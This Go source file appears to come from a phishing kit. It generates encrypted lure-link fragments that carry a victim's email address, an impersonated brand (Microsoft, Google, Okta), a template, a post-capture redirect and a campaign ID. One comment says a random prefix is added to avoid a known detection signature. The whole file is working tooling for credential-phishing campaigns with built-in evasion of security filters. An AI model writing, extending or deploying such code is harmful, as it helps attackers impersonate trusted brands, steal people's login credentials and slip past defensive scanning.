package core

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"time"
)

// LureConfig is the decrypted lure payload that the landing page renders.
type LureConfig struct {
	Version   string `json:"v"`
	Email     string `json:"e,omitempty"` // victim identifier; omitted when empty
	Brand     string `json:"b"`           // "microsoft", "google", "okta"
	Template  string `json:"t"`           // template variant
	Redirect  string `json:"r"`           // post-capture redirect URL
	Campaign  string `json:"c"`           // campaign tracking ID
	Timestamp int64  `json:"ts"`
}

// GenerateLink encrypts a lure configuration with the given AES-256 key and
// returns the base64url-encoded fragment for use in phishing lure URLs.
//
// keyB64 must be a base64-encoded 32-byte AES-256 key.
// If email is empty, the "e" field is omitted from the lure config.
// brand defaults to "microsoft" when empty.
// template defaults to "shared-doc" when empty.
func GenerateLink(keyB64 string, redirect string, campaign string, brand string, template string, email string) (string, error) {
	key, err := base64.StdEncoding.DecodeString(keyB64)
	if err != nil || len(key) != 32 {
		return "", fmt.Errorf("invalid key: must be base64-encoded 32 bytes (got %d bytes)", len(key))
	}

	if brand == "" {
		brand = "microsoft"
	}
	if template == "" {
		template = "shared-doc"
	}

	lure := LureConfig{
		Version:   "1",
		Email:     email,
		Brand:     brand,
		Template:  template,
		Redirect:  redirect,
		Campaign:  campaign,
		Timestamp: time.Now().Unix(),
	}

	plaintext, err := json.Marshal(lure)
	if err != nil {
		return "", fmt.Errorf("marshal lure: %w", err)
	}

	encrypted, err := encryptAESGCM(plaintext, key)
	if err != nil {
		return "", fmt.Errorf("encrypt: %w", err)
	}

	// Prepend random 3-byte prefix — avoids the trivially signatured "bXY9" base64 prefix.
	prefix := make([]byte, 3)
	if _, err := rand.Read(prefix); err != nil {
		return "", fmt.Errorf("random prefix: %w", err)
	}
	full := append(prefix, encrypted...)

	// base64url (no padding) — URL-safe fragment.
	return base64.URLEncoding.WithPadding(base64.NoPadding).EncodeToString(full), nil
}

// encryptAESGCM encrypts plaintext with AES-256-GCM using a random nonce.
// Returns nonce + ciphertext + tag concatenated (12 + N + 16 bytes).
func encryptAESGCM(plaintext, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("new cipher: %w", err)
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("gcm: %w", err)
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, fmt.Errorf("nonce: %w", err)
	}
	return gcm.Seal(nonce, nonce, plaintext, nil), nil
}
